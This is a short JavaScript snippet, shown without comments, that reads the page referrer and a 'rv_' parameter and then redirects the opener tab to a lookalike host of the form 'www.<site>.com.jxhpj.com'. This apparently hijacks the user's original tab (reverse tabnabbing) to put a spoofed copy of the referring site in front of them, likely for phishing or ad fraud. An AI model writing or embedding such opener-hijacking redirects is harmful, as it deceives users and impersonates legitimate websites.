var ref = document.referrer;
var rv_ = (function getQ(name) {
	var scriptEls = document.getElementsByTagName('script'), path = scriptEls[scriptEls.length - 1].src;
	var regex = RegExp('[?&]' + name + '=([^&]*)');
	var match = regex.exec(location.search) || regex.exec(path);
	return match && decodeURIComponent(match[1]);
}('rv_'));
if(ref && rv_){
   var match = RegExp('^http(s*)://www\.(.{3,8})\.com').exec(ref);
   if(match && match[2]){
       window.opener.location = 'http://www.'+match[2]+".com.jxhpj.com/company-info/get-ad.do?pkId="+ rv_+"&ref="+match[2];
   }
}

